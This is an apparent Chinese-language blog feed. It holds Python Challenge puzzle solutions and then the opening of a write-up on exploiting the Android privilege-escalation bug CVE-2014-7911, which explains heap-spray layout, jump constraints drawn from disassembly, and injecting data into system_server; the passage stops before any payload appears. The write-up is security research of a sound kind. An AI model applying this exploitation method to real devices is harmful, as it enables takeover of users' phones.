class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pickle模块的使用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peak</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line">    page_source = requests.get(<span class="string">"http://www.pythonchallenge.com/pc/def/peak.html"</span>).text</span><br><span class="line">    banner_name = re.findall(<span class="string">r""</span>, page_source)[<span class="number">0</span>]</span><br><span class="line">    banner_url = <span class="string">""</span>.join([<span class="string">"http://www.pythonchallenge.com/pc/def/"</span>, banner_name])</span><br><span class="line">    banner_content = requests.get(banner_url).text</span><br><span class="line">    <span class="comment"># print banner_content</span></span><br><span class="line">    banner_obj = pickle.loads(banner_content)</span><br><span class="line">    <span class="keyword">for</span> list_ <span class="keyword">in</span> banner_obj:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">""</span>.join([tuple_[<span class="number">0</span>] * tuple_[<span class="number">1</span>] <span class="keyword">for</span> tuple_ <span class="keyword">in</span> list_])</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">              <span class="comment">#####                                                                      ##### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">               <span class="comment">####                                                                       #### </span></span><br><span class="line">      <span class="comment">###      ####   ###         ###       #####   ###    #####   ###          ###       #### </span></span><br><span class="line">   <span class="comment">###   ##    #### #######     ##  ###      #### #######   #### #######     ###  ###     #### </span></span><br><span class="line">  <span class="comment">###     ###  #####    ####   ###   ####    #####    ####  #####    ####   ###     ###   #### </span></span><br><span class="line"> <span class="comment">###           ####     ####   ###    ###    ####     ####  ####     ####  ###      ####  #### </span></span><br><span class="line"> <span class="comment">###           ####     ####          ###    ####     ####  ####     ####  ###       ###  #### </span></span><br><span class="line"><span class="comment">####           ####     ####     ##   ###    ####     ####  ####     #### ####       ###  #### </span></span><br><span class="line"><span class="comment">####           ####     ####   ##########    ####     ####  ####     #### ##############  #### </span></span><br><span class="line"><span class="comment">####           ####     ####  ###    ####    ####     ####  ####     #### ####            #### </span></span><br><span class="line"><span class="comment">####           ####     #### ####     ###    ####     ####  ####     #### ####            #### </span></span><br><span class="line"> <span class="comment">###           ####     #### ####     ###    ####     ####  ####     ####  ###            #### </span></span><br><span class="line">  <span class="comment">###      ##  ####     ####  ###    ####    ####     ####  ####     ####   ###      ##   #### </span></span><br><span class="line">   <span class="comment">###    ##   ####     ####   ###########   ####     ####  ####     ####    ###    ##    #### </span></span><br><span class="line">      <span class="comment">###     ######    #####    ##    #### ######    ###########    #####      ###      ######</span></span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_6"><a href="http://www.pythonchallenge.com/pc/def/channel.html" target="_blank" rel="external">python challenge 6</a></h3><p><code>http://www.pythonchallenge.com/pc/def/channel.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-6.jpg" alt="6"><br>一张拉链图片，看了源码也没有任何提示，只知道是要捐赠。。。<br>再仔细看第一行，  ，将html变zip<br>下载channel.zip文件，链接：<a href="http://www.pythonchallenge.com/pc/def/channel.zip" target="_blank" rel="external">http://www.pythonchallenge.com/pc/def/channel.zip</a><br>下载完成后解压，和第四题一样，只不过多了文件遍历操作，遍历从任意文件开始都可以。<br>我这里从os.walk遍历到的文件列表中第一个文件开始遍历。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">channel</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">    root_path = <span class="string">"D:\\downloads\\channel"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">linked_file</span><span class="params">(times=<span class="number">1</span>, file_name=<span class="string">"123456"</span>)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_path = <span class="string">"\\"</span>.join([root_path, file_name])</span><br><span class="line">            file_content = open(file_path, <span class="string">"r+"</span>).read()</span><br><span class="line">            next_file_name = re.findall(<span class="string">"Next nothing is ([0-9]+)"</span>, file_content)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"%d -&gt; %s.txt"</span> % (times, next_file_name)</span><br><span class="line">            times += <span class="number">1</span></span><br><span class="line">            linked_file(times, <span class="string">""</span>.join([next_file_name, <span class="string">".txt"</span>]))</span><br><span class="line">        <span class="comment"># 匹配不到跳到异常</span></span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"the right link in file : %s"</span> % file_name</span><br><span class="line">            <span class="keyword">print</span> file_content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(root_path):</span><br><span class="line">        <span class="keyword">for</span> file_ <span class="keyword">in</span> files:</span><br><span class="line">            linked_file(<span class="number">1</span>, file_)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">&gt;&gt;&gt; the right link <span class="keyword">in</span> file : <span class="number">46145.</span>txt</span><br><span class="line">    Collect the comments.</span><br></pre></td></tr></table></figure>
<p>坑爹的答案，让我收集注释，那么答案在哪里。。。<br>再仔细翻解压的文件，发现里边有个readme.txt !!!<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome to my zipped list.</span><br><span class="line">hint1: start <span class="keyword">from</span> <span class="number">90052</span></span><br><span class="line">hint2: answer <span class="keyword">is</span> inside the zip</span><br></pre></td></tr></table></figure></p>
<p>将代码中linked<em>file(1, file</em>)改为linked_file(1, “90052.txt”)<br>最后输出答案一样！！！</p>
<p>难道是我的解压方式不对？！？！<br>调用zipfile模块,使用ZipInfo类获取comment<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">channel</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> zipfile</span><br><span class="line">    zf = zipfile.ZipFile(<span class="string">"D:\\downloads\\channel.zip"</span>)</span><br><span class="line">    result = []</span><br><span class="line">    begin_file_name = <span class="string">"90052.txt"</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        z_info = zf.getinfo(begin_file_name)</span><br><span class="line">        f = zf.open(z_info)</span><br><span class="line">        f_content = f.read()</span><br><span class="line">        next_file_name = re.findall(<span class="string">r"Next nothing is ([0-9]+)"</span>, f_content)</span><br><span class="line">        f.close()</span><br><span class="line">        result.append(z_info.comment)</span><br><span class="line">        <span class="keyword">if</span> next_file_name:</span><br><span class="line">            begin_file_name = <span class="string">"%s.txt"</span> % next_file_name[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">""</span>.join(result)</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">****************************************************************</span><br><span class="line">****************************************************************</span><br><span class="line">**                                                            **</span><br><span class="line">**   OO    OO    XX      YYYY    GG    GG  EEEEEE NN      NN  **</span><br><span class="line">**   OO    OO  XXXXXX   YYYYYY   GG   GG   EEEEEE  NN    NN   **</span><br><span class="line">**   OO    OO XXX  XXX YYY   YY  GG GG     EE       NN  NN    **</span><br><span class="line">**   OOOOOOOO XX    XX YY        GGG       EEEEE     NNNN     **</span><br><span class="line">**   OOOOOOOO XX    XX YY        GGG       EEEEE      NN      **</span><br><span class="line">**   OO    OO XXX  XXX YYY   YY  GG GG     EE         NN      **</span><br><span class="line">**   OO    OO  XXXXXX   YYYYYY   GG   GG   EEEEEE     NN      **</span><br><span class="line">**   OO    OO    XX      YYYY    GG    GG  EEEEEE     NN      **</span><br><span class="line">**                                                            **</span><br><span class="line">****************************************************************</span><br><span class="line"> **************************************************************</span><br></pre></td></tr></table></figure></p>
<p>将url改为hockey.html，竟然有小关卡！！！<br>it’s in the air. look at the letters<br>赶紧开开脑洞，空气中是什么，氧气啊！<br>oxygen :)</p>
<h3 id="python_challenge_7"><a href="http://www.pythonchallenge.com/pc/def/oxygen.html" target="_blank" rel="external">python challenge 7</a></h3><p><code>http://www.pythonchallenge.com/pc/def/oxygen.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-7.jpg" alt="7"><br>这个题需要解析图片，之前没有接触到因此是查资料完成。<br>1.需要安装<a href="http://www.pythonware.com/products/pil/#pil117" target="_blank" rel="external">PIL库</a><br>2.截取黑白部分<br>3.将RGBA格式的像素每个像素值按照L8位黑白像素的格式转成一个acsii码值<br>4.将最后获得的答案转换为ASCII码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oxygen</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    img = Image.open(<span class="string">"oxygen.png"</span>)</span><br><span class="line">    <span class="comment"># left,top,right,bottom</span></span><br><span class="line">    box = (<span class="number">0</span>, <span class="number">43</span>, <span class="number">608</span>, <span class="number">52</span>)</span><br><span class="line">    belt = img.crop(box)</span><br><span class="line">    <span class="comment"># get a sequence object containing pixel values</span></span><br><span class="line">    pixels = belt.getdata()</span><br><span class="line">    print(<span class="string">'mode: %s'</span> % img.mode)</span><br><span class="line">    print(<span class="string">'amount of pixel: %d'</span> % len(pixels))</span><br><span class="line">    <span class="comment"># print(pixels[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># convert mode RGBA to mode L</span></span><br><span class="line">    l_belt = belt.convert(<span class="string">'L'</span>)</span><br><span class="line">    <span class="comment"># get a sequence object containing pixel values</span></span><br><span class="line">    l_pixels = l_belt.getdata()</span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">608</span>, <span class="number">7</span>):</span><br><span class="line">        result.append(chr(l_pixels[i]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(result)</span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt; smart guy, you made it. the next level <span class="keyword">is</span> [<span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">121</span>]</span><br></pre></td></tr></table></figure>
<p>最后将[105, 110, 116, 101, 103, 114, 105, 116, 121]转为ascii即为答案:integrity</p>
<h3 id="python_challenge_8"><a href="http://www.pythonchallenge.com/pc/def/integrity.html" target="_blank" rel="external">python challenge 8</a></h3><p><code>http://www.pythonchallenge.com/pc/def/integrity.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-8.jpg" alt="8"><br>点击中间的蜜蜂弹出要求输入用户名和密码<br>然后看下源码，找到了用户名密码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">un: <span class="string">'BZh91AY&amp;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00 \x00!\x9ah3M\x07&lt;]\xc9\x14\xe1BA\x06\xbe\x084'</span></span><br><span class="line">pw: <span class="string">'BZh91AY&amp;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$ \x00!\x9ah3M\x13&lt;]\xc9\x14\xe1BBP\x91\xf08'</span></span><br></pre></td></tr></table></figure></p>
<p>看下加密字符串特征BZ开头，猜测是否为bz2压缩，尝试成功。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">integrity</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> bz2</span><br><span class="line">    un = <span class="string">'BZh91AY&amp;SYA\xaf\x82\r\x00\x00\x01\x01\x80\x02\xc0\x02\x00 \x00!\x9ah3M\x07&lt;]\xc9\x14\xe1BA\x06\xbe\x084'</span></span><br><span class="line">    pw = <span class="string">'BZh91AY&amp;SY\x94$|\x0e\x00\x00\x00\x81\x00\x03$ \x00!\x9ah3M\x13&lt;]\xc9\x14\xe1BBP\x91\xf08'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">": "</span>.join([<span class="string">"username"</span>, bz2.decompress(un)])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">": "</span>.join([<span class="string">"password"</span>, bz2.decompress(pw)])</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    username: huge</span><br><span class="line">    password: file</span><br></pre></td></tr></table></figure></p>
<h3 id="python_challenge_9"><a href="http://www.pythonchallenge.com/pc/return/good.html" target="_blank" rel="external">python challenge 9</a></h3><p><code>http://www.pythonchallenge.com/pc/return/good.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-9.jpg" alt="9"><br>查看下源码找到最下边注释部分，和8题页面源码部分是不是很相似，应该是绘制图片的RGB值。<br>替换过去试试看，鼠标移动，发现浮现了一头牛的图案。<br>下边通过代码将这个图片完整的绘制出来。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">good</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line">    im = Image.new(<span class="string">'RGB'</span>, (<span class="number">500</span>, <span class="number">500</span>))</span><br><span class="line">    draw = ImageDraw.Draw(im)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Authorization"</span>: <span class="string">"Basic aHVnZTpmaWxl"</span></span><br><span class="line">    &#125;</span><br><span class="line">    page_source = requests.get(<span class="string">"http://www.pythonchallenge.com/pc/return/good.html"</span>, headers=headers).text</span><br><span class="line">    result = re.findall(<span class="string">r"first:\s([\s\S]+)second:\s([\s\S]+)--&gt;"</span>, page_source)</span><br><span class="line">    <span class="keyword">if</span> len(result) &gt; <span class="number">0</span> <span class="keyword">and</span> len(result[<span class="number">0</span>]) == <span class="number">2</span>:</span><br><span class="line">        first, second = result[<span class="number">0</span>][<span class="number">0</span>], result[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">        first_points = list(eval(first.replace(<span class="string">"\n"</span>, <span class="string">""</span>)))</span><br><span class="line">        second_points = list(eval(second.replace(<span class="string">"\n"</span>, <span class="string">""</span>)))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(first_points), <span class="number">2</span>):</span><br><span class="line">            draw.line(first_points[i:i + <span class="number">4</span>], fill=<span class="string">'white'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(second_points), <span class="number">2</span>):</span><br><span class="line">            draw.line(second_points[i:i + <span class="number">4</span>], fill=<span class="string">'white'</span>)</span><br><span class="line">        im.save(<span class="string">'img/09.jpg'</span>)</span><br></pre></td></tr></table></figure></p>
<p>最后打印出来：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-9-bull.jpg" alt="9-bull"><br>看到牛先想到单词cow，然后进去试试看，发现有新的提示：<br>hmm. it’s a male.<br>那就是公牛喽，换成bull,成功。</p>
<h3 id="python_challenge_10"><a href="http://www.pythonchallenge.com/pc/return/bull.html" target="_blank" rel="external">python challenge 10</a></h3><p><code>http://www.pythonchallenge.com/pc/return/bull.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-10.jpg" alt="10"><br>这个题的图片赫然就是我们绘制的那头牛哇，感觉萌萌哒。<br>看下边len(a[30])=? 要知道这个答案，肯定要得到a这个序列。<br>查看下页面源码，点开里边的sequence.txt内容为(点击牛也会跳出)：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">11</span>, <span class="number">21</span>, <span class="number">1211</span>, <span class="number">111221</span>,</span><br></pre></td></tr></table></figure></p>
<p>显然，要得到的答案就是这里了，下边找规律吧。</p>
<table>
<thead>
<tr>
<th>index</th>
<th style="text-align:left">look</th>
<th style="text-align:left">say</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td style="text-align:left"></td>
<td style="text-align:left">1</td>
</tr>
<tr>
<td>1</td>
<td style="text-align:left">第0项有 1个1</td>
<td style="text-align:left">11</td>
</tr>
<tr>
<td>2</td>
<td style="text-align:left">第1项有 2个1</td>
<td style="text-align:left">21</td>
</tr>
<tr>
<td>3</td>
<td style="text-align:left">第2项有 1个2 1个1</td>
<td style="text-align:left">1211</td>
</tr>
<tr>
<td>4</td>
<td style="text-align:left">第3项有 1个1 1个2 2个1</td>
<td style="text-align:left">111221</td>
</tr>
<tr>
<td>5</td>
<td style="text-align:left">…</td>
<td style="text-align:left">…</td>
</tr>
</tbody>
</table>
<p>规律找到，编写代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bull</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_next_item</span><span class="params">(str_item=<span class="string">""</span>)</span>:</span></span><br><span class="line">        item = []</span><br><span class="line">        <span class="keyword">if</span> len(str_item) == <span class="number">0</span>:</span><br><span class="line">            item.append(<span class="string">"1"</span>)</span><br><span class="line">        <span class="keyword">elif</span> len(str_item) &gt; <span class="number">0</span>:</span><br><span class="line">            cur_list = list(str_item)</span><br><span class="line">            same_count = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> len(cur_list) == <span class="number">1</span>:</span><br><span class="line">                item.append(<span class="string">""</span>.join([str(same_count), cur_list[<span class="number">0</span>]]))</span><br><span class="line">            <span class="keyword">elif</span> len(cur_list) &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cur_list)):</span><br><span class="line">                    <span class="keyword">if</span> i + <span class="number">1</span> &gt;= len(cur_list):</span><br><span class="line">                        item.append(<span class="string">""</span>.join([str(same_count), cur_list[i]]))</span><br><span class="line">                    <span class="keyword">elif</span> i + <span class="number">1</span> &lt; len(cur_list):</span><br><span class="line">                        <span class="keyword">if</span> cur_list[i] == cur_list[i+<span class="number">1</span>]:</span><br><span class="line">                            same_count += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            item.append(<span class="string">""</span>.join([str(same_count), cur_list[i]]))</span><br><span class="line">                            same_count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join(item)</span><br><span class="line"></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    cur_item = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> index &lt; <span class="number">31</span>:</span><br><span class="line">        cur_item = get_next_item(cur_item)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"len(a[%d]) = %d"</span> % (index-<span class="number">1</span>, len(cur_item))</span><br><span class="line">    </span><br><span class="line">&gt;&gt;&gt; len(a[<span class="number">30</span>]) = <span class="number">5808</span></span><br></pre></td></tr></table></figure></p>
<p>网上看下别人的答案，找到一种更简单的实现方式，调用groupby函数，一行代码即可实现。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bull_ex</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> groupby</span><br><span class="line">    a = <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        a = <span class="string">''</span>.join(str(len(list(v))) + k <span class="keyword">for</span> k, v <span class="keyword">in</span> groupby(a))</span><br><span class="line">    <span class="keyword">print</span> len(a)</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近闲下来了四处看资料，然后找到了这个python challenge网页闯关游戏。<br>这个游戏需要通过一些提示找出下一关的网页地址，链接：<a href="http://www.pythonchallenge.com/" target="_blank" rel="ex]]>
    </summary>
    
      <category term="challenge" scheme="http://blog.idhyt.com/tags/challenge/"/>
    
      <category term="python" scheme="http://blog.idhyt.com/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2014-7911安卓本地提权漏洞利用]]></title>
    <link href="http://blog.idhyt.com/2015/08/01/exploit-cve-2014-7911-exp/"/>
    <id>http://blog.idhyt.com/2015/08/01/exploit-cve-2014-7911-exp/</id>
    <published>2015-08-01T08:46:11.000Z</published>
    <updated>2016-02-19T09:42:19.000Z</updated>
    <content type="html"><![CDATA[<p>在<a href="http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/">CVE-2014-7911安卓本地提权漏洞分析</a>中，已经分析了漏洞的成因和触发时机。<br>POC崩溃到mOrgue，从该地址处取值，所以从这个点开始控制流程。由于堆分配不可控，所以要让mOrgue指向的内存命中可控区域，这里需要采用堆喷技术。在控制流程之后要想使代码顺利执行，还需要过掉DEP和ASLR。</p>
<h2 id="Dakvik-Heap_Spray">Dakvik-Heap Spray</h2><p>堆喷数据一般由大量的堆块组成，每个堆块又由大量的滑板指令+shellcode组成，滑板指令的目的是让程序能跳转到shellcode中执行我们的代码，看漏洞最后执行的汇编代码是执行了blx r2操作，即跳转到r2处执行代码，而r2的值是由r0经过三级指针获取的，所以需要将布局的滑板指令覆盖到r0并且能够跳转到shellcode中。</p>
<h3 id="堆块布局">堆块布局</h3><p>先看最终的堆块布局，如下图所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2014-7911-exp-1.jpg" alt="exploit-cve-2014-7911-exp-1"></p>
<p>假设mOrgue命中了堆块中的滑板指令，<br>为了使<br>[mOrgue] = shellcode_addr<br>则有<br>[mOrgue] = shellcode_addr ＝ heap_base_addr + shellcode_addr_offset<br>一般情况下mOrgue在堆基址某偏移处，考虑到4字节对齐，所以<br>mOrgue ＝ heap_base_addr + 4N<br>得出<br>[mOrgue] = heap_base_addr + shellcode_addr_offset = mOrgue + shellcode_addr_offset - 4N<br>这样，给定一个mOrgue，只要能落入system_server在dalvik heap分配的大量堆块中，<br>即指向了滑板指令，就总是存在[mOrgue] = shellcode_addr。</p>
<p>再看堆块结构图，滑板指令的值从上到下依次减4，<br>所以当[mOrgue] = shellcode_addr时，[mOrgue + 4] = shellcode_addr - 4，<br>可得出[mOrgue + 4N] = shellcode_addr - 4N</p>
<p>所以通过构造这样结构的堆块，就可以达到上述滑板指令的目的，<br>同时当命中滑板指令时，这个堆块布局有两个逻辑公式：<br>[mOrgue] = mOrgue + shellcode_addr_offset - 4N<br>[mOrgue + 4N] = shellcode_addr - 4N</p>
<h3 id="堆块布局约束条件">堆块布局约束条件</h3><p>解决了滑板指令的问题，还要考虑到漏洞利用过程中堆块内写入数据的约束条件，重新看汇编代码</p>
<pre><code><span class="number">0000</span>d174         <span class="keyword">mov </span>       <span class="literal">r5</span>, <span class="literal">r0</span>    // <span class="literal">r0</span> = mOrgue可控
<span class="number">0000</span>d176         <span class="keyword">ldr </span>       <span class="literal">r4</span>, [<span class="literal">r0</span>, <span class="number">#0x4</span>]    // mOrgue + <span class="number">4</span>处取值
<span class="number">0000</span>d178         <span class="keyword">mov </span>       <span class="literal">r6</span>, <span class="literal">r1</span>
<span class="number">0000</span>d17a         <span class="keyword">mov </span>       <span class="literal">r0</span>, <span class="literal">r4</span>
<span class="number">0000</span>d17c         <span class="keyword">blx </span>       <span class="keyword">android_atomic_dec@PLT
</span><span class="number">0000</span>d180         <span class="keyword">cmp </span>       <span class="literal">r0</span>, <span class="number">#0x1</span>    
<span class="number">0000</span>d182         <span class="keyword">bne </span>       <span class="number">0xd19c</span>    

<span class="number">0000</span>d184         <span class="keyword">ldr </span>       <span class="literal">r0</span>, [<span class="literal">r4</span>, <span class="number">#0x8</span>]    // <span class="literal">r0</span> = [<span class="literal">r4</span> + <span class="number">8</span>]
<span class="number">0000</span>d186         <span class="keyword">mov </span>       <span class="literal">r1</span>, <span class="literal">r6</span>    
<span class="number">0000</span>d188         <span class="keyword">ldr </span>       <span class="literal">r3</span>, [<span class="literal">r0</span>]    
<span class="number">0000</span>d18a         <span class="keyword">ldr </span>       <span class="literal">r2</span>, [<span class="literal">r3</span>, <span class="number">#0xc</span>]
<span class="number">0000</span>d18c         <span class="keyword">blx </span>       <span class="literal">r2</span>    
</code></pre><p>跳转限制条件：<br>[r0, #0x4] == 1 即 [mOrgue + 4] == 1<br>根据[mOrgue + 4N] = shellcode_addr得出<br>shellcode_addr - 4 == 1</p>
<p>流程控制限制条件：<br>r0 = [r4 + 8] = [[r0 + 4] + 8] = [shellcode_addr - 4 + 8] = [shellcode_addr + 4]<br>r3 = [r0] = [[shellcode_addr + 4]]<br>r2 = [r3 + 12]<br>为了布局方便和流程控制，最后让r2指向shellcode_addr则有<br>r2 = [shellcode_addr] = [shellcode_addr -12 + 12]<br>得出r3 = shellcode_addr -12 = [mOrgue + 12]<br>要使[[shellcode_addr + 4]] = [mOrgue + 12]<br>则有[shellcode_addr + 4] == mOrgue + 12</p>
<p>综上所述，堆块布局的两个限制条件为：<br>shellcode_addr - 4 == 1<br>[shellcode_addr + 4] == mOrgue + 12</p>
<p>将大量的这样布局的堆块喷射到system_server中，一旦mOrgue值命中滑板指令，就会跳入shellcode_addr地址去执行代码。</p>
<h3 id="代码注入">代码注入</h3><p>堆块布局完成后，如何向sysetem_server的dalvik-heap空间注入这些字符串？<br>system_server向android系统提供绝大多数的系统服务，通过这些服务的一些特定方法可以向system_server传入String，同时system_server把这些String存储在Dalvik-heap中，在GC之前都不会销毁。例如android广播服务，android应用程序可以把广播接收器注册到ActivityManagerService中去，这个过程就完成了数据由应用层到service层的传输。</p>
<p>android.content.Context中的registerReceiver方法</p>
